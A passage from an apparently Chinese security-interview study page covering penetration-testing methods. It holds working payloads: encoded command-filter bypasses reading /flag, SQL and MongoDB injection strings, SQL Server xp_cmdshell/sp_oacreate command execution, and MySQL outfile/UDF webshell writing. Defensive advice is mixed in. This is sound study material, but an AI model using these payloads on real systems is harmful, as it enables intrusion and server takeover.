class="language-bash">单引号、双引号绕过 ca<span class="hljs-string">&#x27;&#x27;</span>t flag <span class="hljs-built_in">cat</span><span class="hljs-string">&quot;&quot;</span> flag</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">编码绕过</span> <br><span class="hljs-meta prompt_"> $</span><span class="language-bash">(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) ==&gt;<span class="hljs-built_in">cat</span> /flag</span> <br><span class="hljs-meta prompt_"> #</span><span class="language-bash">&#123;<span class="hljs-built_in">printf</span>,<span class="hljs-string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|\<span class="hljs-variable">$0</span> ==&gt;<span class="hljs-built_in">cat</span> /flag</span> <br><span class="hljs-meta prompt_"> #</span><span class="language-bash">$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\154\163&quot;</span>) ==&gt;<span class="hljs-built_in">ls</span></span> <br><span class="hljs-meta prompt_"> $</span><span class="language-bash">(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\154\163&quot;</span>)</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看等价替换</span><br>(1)more:一页一页的显示档案内容 <br>(2)less:与more类似，但是比more更好的是，他可以[pg dn][pg up]翻页 <br>(3)head:查看头几行 <br>(4)tac:从最后一行开始显示，可以看出tac是cat的反向显示 <br>(5)tail:查看尾几行 <br>(6)nl：显示的时候，顺便输出行号 <br>(7)od:以二进制的方式读取档案内容 <br>(8)vi:一种编辑器<br>(9)vim:一种编辑器<br>(10)sort:可以查看 <br>(11)uniq:可以查看 <br>(12)file -f:报错出具体内容<br><span class="hljs-meta prompt_"># </span><span class="language-bash">反斜线绕过 c\at fl\ag</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">内敛注释绕过 <span class="hljs-comment">#`命令`和$(命令)都是执行命令的方式 echo &quot;m0re`cat flag`&quot; echo &quot;m0re $(cat flag)&quot;</span></span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">base64</span>编码绕过 `<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|<span class="hljs-built_in">base64</span> -d`</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">绕过长度限制</span> <br><span class="hljs-meta prompt_"> # </span><span class="language-bash">&gt;命令会将原有文件内容覆盖 <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>&gt;xxoo.txt <span class="hljs-comment"># &gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容 echo &#x27;233&#x27;&gt;&gt;xxoo.txt</span></span> <br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">命令换行绕过</span> <br> ca\ <br> a\<br></code></pre></td></tr></table></figure>

<h1 id="0x01-渗透思路篇"><a href="#0x01-渗透思路篇" class="headerlink" title="0x01.渗透思路篇"></a>0x01.渗透思路篇</h1><h2 id="00-拿到目标站以后的渗透思路？"><a href="#00-拿到目标站以后的渗透思路？" class="headerlink" title="00-拿到目标站以后的渗透思路？"></a>00-拿到目标站以后的渗透思路？</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>渗透测试流程：<br><span class="hljs-bullet">1.</span> 项目前期准备工作<br><span class="hljs-bullet">2.</span> 信息收集：whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息<br><span class="hljs-bullet">3.</span> 漏洞扫描：Nessus, AWVS<br><span class="hljs-bullet">4.</span> 手动挖掘：逻辑漏洞<br><span class="hljs-bullet">5.</span> 验证漏洞<br><span class="hljs-bullet">6.</span> 修复建议<br><span class="hljs-bullet">7.</span> （如果有）基线检查/复验漏洞<br><span class="hljs-bullet">8.</span> 输出报告<br></code></pre></td></tr></table></figure>

<h2 id="01-如何绕过CDN查真实IP？"><a href="#01-如何绕过CDN查真实IP？" class="headerlink" title="01-如何绕过CDN查真实IP？"></a>01-如何绕过CDN查真实IP？</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/32b2a698ed5c3825c16a877c703e6a57.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.多地ping看是否有cdn<br><span class="hljs-number">2</span>.邮件订阅或者rss订阅<br><span class="hljs-number">3</span>.二级域名可能不会做cdn<br><span class="hljs-number">4</span>.nslookup http:<span class="hljs-comment">//xxx.com 国外dns</span><br><span class="hljs-number">5</span>.查找域名历史解析记录，因为域名在上CDN之前用的<span class="hljs-built_in">IP</span>，很有可能就是CDN的真实源<span class="hljs-built_in">IP</span>地址 <br><span class="hljs-number">6</span>.phpinfo上显示的信息<br><span class="hljs-number">7</span>.cloudflare github可以获取真实<span class="hljs-built_in">IP</span><br><span class="hljs-number">8</span>.一个网站有icon 可以根据icon hash 来查找真实<span class="hljs-built_in">IP</span><br><span class="hljs-number">9</span>.子域名绑定 测试子域可能回源<br></code></pre></td></tr></table></figure>

<h2 id="02-sleep函数被禁用后怎么进行sql注入？"><a href="#02-sleep函数被禁用后怎么进行sql注入？" class="headerlink" title="02-sleep函数被禁用后怎么进行sql注入？"></a>02-sleep函数被禁用后怎么进行sql注入？</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。</span><br><span class="hljs-keyword"></span>mysql：`<span class="hljs-keyword">AND </span>(SELECT <span class="hljs-built_in">count</span>(*) FROM information_schema.columns A, information_schema.columns <span class="hljs-keyword">B, </span>information_schema.<span class="hljs-keyword">SCHEMATA </span>C)<span class="hljs-comment">;`</span><br></code></pre></td></tr></table></figure>

<h2 id="03-哪些地方存在xxe？架构问题？"><a href="#03-哪些地方存在xxe？架构问题？" class="headerlink" title="03-哪些地方存在xxe？架构问题？"></a>03-哪些地方存在xxe？架构问题？</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs lasso">xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让<span class="hljs-built_in">XML</span>作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。<br>xxe危害 读取本地文件，执行系统命令，探测内网端口，攻击内网服务<br>探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定 file http ftp是常用的<br><br>防范，python用lxml时可以对resolve_entities设为<span class="hljs-literal">false</span>。或者过滤用户提交的<span class="hljs-built_in">xml</span><br><br>客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析<br>Java解析<span class="hljs-built_in">XML</span>的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：<br><br>javax.<span class="hljs-built_in">xml</span>.stream.XMLStreamReader;<br>javax.<span class="hljs-built_in">xml</span>.parsers.DocumentBuilderFactory;<br></code></pre></td></tr></table></figure>

<h2 id="04-如何绕过Http-only？"><a href="#04-如何绕过Http-only？" class="headerlink" title="04-如何绕过Http-only？"></a>04-如何绕过Http-only？</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">HTTP-Only禁止的是JS读取cookie信息，Http <span class="hljs-keyword">Trace</span>攻击就可以将你的<span class="hljs-built_in">Header</span>里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如<span class="hljs-built_in">header</span>头的泄漏<br></code></pre></td></tr></table></figure>

<h2 id="05-SQL二次注入？"><a href="#05-SQL二次注入？" class="headerlink" title="05-SQL二次注入？"></a>05-SQL二次注入？</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">第一次进行数据库插入数据的时候，仅仅只是使用了`addslashes`或者是借助`get_magic_quotes_gpc`对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成<span class="hljs-keyword">SQL</span>的二次注入。<br><br>交友网站，填写年龄处是一个注入点，页面会显示出与你相同年龄的用户有几个。使用<span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>确定注入点，用<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>探测列数，<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>探测输出点是第几列，<br><br><span class="hljs-number">1.</span> 爆库 `group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata`<br><span class="hljs-number">2.</span> 爆表 `group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;hhh&#x27;</span>`<br><span class="hljs-number">3.</span> 获取数据 `concat(flag) <span class="hljs-keyword">from</span> flag`<br><br>修复：在从数据库或文件中取数据的时候，也要进行转义或者过滤。<br></code></pre></td></tr></table></figure>

<h2 id="06-SQLserver提权"><a href="#06-SQLserver提权" class="headerlink" title="06-SQLserver提权"></a>06-SQLserver提权</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql">xp_cmdshell提权<br> xp_cmdshell是<span class="hljs-keyword">Sql</span> Server中的一个组件，可以用来执行系统命令,在拿到sa口令之后，经常可以通过xp_cmdshell来进行提权<br><br>前提：<br>getshell或者存在<span class="hljs-keyword">sql</span>注入并且能够执行命令。<br><span class="hljs-keyword">sql</span> server是<span class="hljs-keyword">system</span>权限，<span class="hljs-keyword">sql</span> server默认就是<span class="hljs-keyword">system</span>权限<br><br>启用xp_cmdshell<br><span class="hljs-keyword">EXEC</span> master..sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-keyword">EXEC</span> master..sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<br># 通过xp_cmdshell执行系统命令<br><span class="hljs-keyword">Exec</span> master.dbo.xp_cmdshell <span class="hljs-string">&#x27;whoami&#x27;</span><br>sp_oacreate提权<br> 在xp_cmdshell被删除或者出错情况下，可以充分利用SP_OACreate进行提权，<br><br>前提：<br>需要同时具备sp_oacreate和sp_oamethod两个功能组件<br><br># 开启组件<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;   <br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">0</span>;<br># 执行系统命令（无回显）<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe /c whoami&#x27;</span><br>通过沙盒执行命令<br># 开启沙盒<br><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">1</span><br># 利用jet.oledb执行命令<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\dnary.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;whoami&quot;)&#x27;</span>)<br>通过Agent Job执行命令<br>修改开启Ageent Job，执行无回显CobaltStrike生成powershell上线<br></code></pre></td></tr></table></figure>

<h2 id="07-GPC是什么？GPC之后怎么绕过？"><a href="#07-GPC是什么？GPC之后怎么绕过？" class="headerlink" title="07-GPC是什么？GPC之后怎么绕过？"></a>07-GPC是什么？GPC之后怎么绕过？</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">如果`magic_quotes_gpc=On`，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染。<br></code></pre></td></tr></table></figure>

<h2 id="08-如何防范webshell"><a href="#08-如何防范webshell" class="headerlink" title="08-如何防范webshell"></a>08-如何防范webshell</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">防范的措施大概有三种<br>第一种的思路是将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。<br>第二种是匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。<br>第三种是将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。<br></code></pre></td></tr></table></figure>

<h2 id="09-webshell检查思路"><a href="#09-webshell检查思路" class="headerlink" title="09-webshell检查思路"></a>09-webshell检查思路</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。<br><br>黑客通过浏览器以HTTP协议访问Web Server上的一个CGI文件，是一个合法的TCP连接，TCP/IP的应用层之下没有任何特征，只能在应用层进行检测。黑客入侵服务器，使用webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测；webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。<br><br>静态检测<br>静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。缺点漏报率、误报率高，无法查找<span class="hljs-number">0</span>day型webshell，而且容易被绕过。<br><br>静态检测配合人工<br>一个检查工具 https:<span class="hljs-comment">//github.com/he1m4n6a/findWebshell</span><br><br>动态检测<br>Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。再者如果黑客反向连接的话，那很更容易检测了，Agent和IDS都可以抓现行。Webshell总有一个HTTP请求，如果我在网络层监控HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了<span class="hljs-number">200</span>，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。<br><br>日志检测<br>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。<br>寻找webshell<br><span class="hljs-number">1</span>.自动化查找  D盾 河马  fotify  <br><span class="hljs-number">2</span>.手动查找  windows  sublime  全文件夹查找 IDE PHPSTORM 全局查找<br>   Linux  命令查找  `grep -rn <span class="hljs-string">&quot;eval(&quot;</span> *`<br>   webshell特征 PHP的危险函数<br>   还有`phar <span class="hljs-meta">&lt;?php</span> XXXXX`<br></code></pre></td></tr></table></figure>

<h2 id="10-如何查找DNS解析记录"><a href="#10-如何查找DNS解析记录" class="headerlink" title="10-如何查找DNS解析记录"></a>10-如何查找DNS解析记录</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 查看浏览器缓存<br><span class="hljs-bullet">2.</span> 查看系统缓存<br><span class="hljs-bullet">3.</span> 查看路由器缓存<br><span class="hljs-bullet">4.</span> 查找ISP DNS缓存<br><span class="hljs-bullet">5.</span> 递归搜索。根据网址，发送一个DNS请求，UDP请求，端口为543，会请求一个 DNS服务器，DNS服务器会不断递归查找这个网址的IP<br></code></pre></td></tr></table></figure>

<h2 id="11-如何分析DDOS攻击？"><a href="#11-如何分析DDOS攻击？" class="headerlink" title="11- 如何分析DDOS攻击？"></a>11- 如何分析DDOS攻击？</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">1.HTTP抓包分析<br>2.HTTPDebug协议分析<br>3.netstat命令<br>4.冰盾DDOS攻击监控器<br>5.查看网卡接包和发送情况<br></code></pre></td></tr></table></figure>

<h2 id="12-如何快速判定XSS类型？"><a href="#12-如何快速判定XSS类型？" class="headerlink" title="12-如何快速判定XSS类型？"></a>12-如何快速判定XSS类型？</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">存储型XSS：<br> 你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；<br>反射型XSS：<br> 你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；<br>DOM型XSS：<br> 你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子；<br>CSP策略：浏览器内容安全策略，减少xss攻击。<br></code></pre></td></tr></table></figure>

<h2 id="13-CSRF、SSRF和重放攻击有什么区别？"><a href="#13-CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="13-CSRF、SSRF和重放攻击有什么区别？"></a>13-CSRF、SSRF和重放攻击有什么区别？</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>CSRF是跨站请求伪造攻击，由客户端发起 <br><span class="hljs-bullet">- </span>SSRF是服务器端请求伪造，由服务器发起 <br><span class="hljs-bullet">- </span>重放攻击是将截获的数据包进行重放，达到身份认证等目的<br></code></pre></td></tr></table></figure>

<h2 id="14-CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#14-CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="14-CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>14-CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso">XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。 <br><br>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验<span class="hljs-keyword">Referer</span>.<br><br>XXE是<span class="hljs-built_in">XML</span>外部实体注入攻击，<span class="hljs-built_in">XML</span>中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：<span class="hljs-built_in">XML</span>解析库在调用时严格禁止对外部实体的解析。<br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/249509d898d09939e1abbfb32fd93f55.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<h2 id="15-MongoDB注入方式"><a href="#15-MongoDB注入方式" class="headerlink" title="15-MongoDB注入方式"></a>15-MongoDB注入方式</h2><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs julia">利用正则：找到y开头的name <span class="hljs-string">`db.items.find(&#123;name: &#123;<span class="hljs-variable">$regex</span>:&quot;^y&quot;&#125;&#125;)`</span><br><br>一些payload<br><span class="hljs-number">1.</span><span class="hljs-string">`?login[<span class="hljs-variable">$regex</span>]=^&amp;password[<span class="hljs-variable">$regex</span>]=^`</span><br><span class="hljs-number">2.</span><span class="hljs-string">`?login[<span class="hljs-variable">$not</span>][<span class="hljs-variable">$type</span>]=1&amp;password[<span class="hljs-variable">$not</span>][<span class="hljs-variable">$type</span>]=1`</span><br></code></pre></td></tr></table></figure>

<h2 id="16-mysql的网站，5-0以上和5-0以下有什么区别？"><a href="#16-mysql的网站，5-0以上和5-0以下有什么区别？" class="headerlink" title="16-mysql的网站，5.0以上和5.0以下有什么区别？"></a>16-mysql的网站，5.0以上和5.0以下有什么区别？</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">5</span>.<span class="hljs-number">0</span>以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。<br><span class="hljs-attribute">5</span>.<span class="hljs-number">0</span>以下是多用户单操作，<span class="hljs-number">5</span>.<span class="hljs-number">0</span>以上是多用户多操作<br></code></pre></td></tr></table></figure>

<h2 id="17-MySQL写shell的问题"><a href="#17-MySQL写shell的问题" class="headerlink" title="17-MySQL写shell的问题"></a>17-MySQL写shell的问题</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1.</span>写<span class="hljs-built_in">shell</span>用什么函数？ <br>   - `<span class="hljs-built_in">select</span> &#x27;&lt;?php <span class="hljs-built_in">phpinfo</span>()&gt; into outfile &#x27;D:/shelltest.php&#x27;`<br>   - `dumpfile`<br>   - `file_put_contents`<br><span class="hljs-number">2.</span>outfile不能用了怎么办？ `<span class="hljs-built_in">select</span> <span class="hljs-built_in">unhex</span>(&#x27;udf.dll hex <span class="hljs-built_in">code</span>&#x27;) into dumpfile &#x27;c:/mysql/mysql server <span class="hljs-number">5.1</span>/<span class="hljs-keyword">lib</span>/plugin/xxoo.dll&#x27;;`可以UDF提权 https:<span class="hljs-comment">//www.cnblogs.com/milantgh/p/5444398.html</span><br><span class="hljs-number">3.</span>dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。<br><span class="hljs-number">4.</span><span class="hljs-built_in">sleep</span>()能不能写<span class="hljs-built_in">shell</span>？<br><span class="hljs-number">5.</span> 写<span class="hljs-built_in">shell</span>的条件？<br>   - 用户权限<br>   - 目录读写权限<br>   - 防止命令执行：`disable_functions`，禁止了`disable_functions=phpinfo,<span class="hljs-built_in">exec</span>,passthru,shell_exec,<span class="hljs-keyword">system</span>,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source`，但是可以用dl扩展执行命令或者ImageMagick漏洞 https:<span class="hljs-comment">//www.waitalone.cn/imagemagic-bypass-disable_function.html</span><br>  open_basedir: 将用户可操作的文件限制在某目录下<br>mysql写<span class="hljs-built_in">shell</span>的条件<br><span class="hljs-number">1</span>、网站可访问路径的绝对路径<br><span class="hljs-number">2</span>、secure_file_priv 的值非<span class="hljs-built_in">NULL</span>或包含了导出的绝对路径<br>secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出<br>Mysql&gt;=<span class="hljs-number">5.5</span><span class="hljs-number">.53</span> 默认为<span class="hljs-built_in">NULL</span>，即默认禁止导入导出<br>Mysql&lt;<span class="hljs-number">5.5</span><span class="hljs-number">.53</span> 默认为空，即默认无限制<br><span class="hljs-number">3</span>、mysql服务有对网站可访问路径的写权限<br><span class="hljs-number">4</span>、mysql连接用户有FILE权限/ROOT用户或ROOT权限<br><span class="hljs-number">5</span>、GPC关闭<span class="hljs-comment">//未对闭合用的引号转义</span><br>outfile 和 dumpfile的路径不支持hex，必须有引号包裹<br><span class="hljs-meta">## mysql日志写shell</span><br>与导出函数写<span class="hljs-built_in">Shell</span>相比，规避了 secure_file_priv 的限制<br><span class="hljs-number">1.</span>网站可访问路径的绝对路径<br><span class="hljs-number">2.</span>mysql服务有对网站可访问路径的写权限<br><span class="hljs-number">3.</span>mysql连接用户有权限开启日志记录和更换日志路径/ROOT权限<br><span class="hljs-number">4.</span>GPC关闭/未对闭合用的引号转义<br> 虽然日志路径可以hex编码，但被记入日志的查询语句中的<span class="hljs-built_in">shell</span>内容需要引号包裹，加`\`后传到数据库执行会报错，无法记录进日志<br>root权限<br>GPC 关闭（能使用单引号），magic_quotes_gpc=On<br>有绝对路径（读文件可以不用，写文件必须）<br>没有配置–secure-file-priv<br>成功条件：有读写的权限，有 <span class="hljs-keyword">create</span>、insert、<span class="hljs-built_in">select</span> 的权限<br></code></pre></td></tr></table></figure>

<h2 id="18-disable-functions-绕过"><a href="#18-disable-functions-绕过" class="headerlink" title="18-disable_functions 绕过"></a>18-disable_functions 绕过</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. 黑名单总有漏网之鱼，多尝试一些函数<br><span class="hljs-attribute">2</span>. LD_PRELOAD：原理就是劫持系统函数，使程序加载恶意动态链接库文件，从而执行系统命令等敏感操作<br><span class="hljs-attribute">3</span>. lmageMagick：利用lmageMagick命令执行漏洞（CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">3714</span>）<br><span class="hljs-attribute">4</span>. Windows系统组件COM绕过<br><span class="hljs-attribute">5</span>. PHP7.<span 